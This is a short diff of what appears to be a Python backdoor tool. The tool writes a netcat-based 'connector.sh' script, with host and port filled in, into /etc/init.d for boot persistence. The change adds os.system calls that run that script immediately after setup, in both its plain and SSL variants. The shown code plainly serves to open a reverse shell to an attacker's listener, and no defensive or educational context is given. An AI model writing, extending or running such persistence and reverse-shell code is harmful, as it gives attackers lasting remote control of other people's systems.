@@ -41,6 +41,7 @@ if shell_type == "NC":  #add host and port to connect.sh to init.d
 	 f.write(sh_template_ssl)
 	 f.close()
 	 cprint("[+]setup done ! you can listen to your host now","blue")
+	 os.system("sh /etc/init.d/connector.sh")
   except:  
          cprint("[!]cannot add connector.sh","red")
          sys.exit(0)	  	
@@ -54,6 +55,7 @@ if shell_type == "NC":  #add host and port to connect.sh to init.d
 	 f.write(sh_template)
 	 f.close()
 	 cprint("[+]setup done ! you can listen to your host now","blue")
+	 os.system("sh /etc/init.d/connector.sh")
   except:  
          cprint("[!]cannot add connector.sh","red")
          sys.exit(0)	
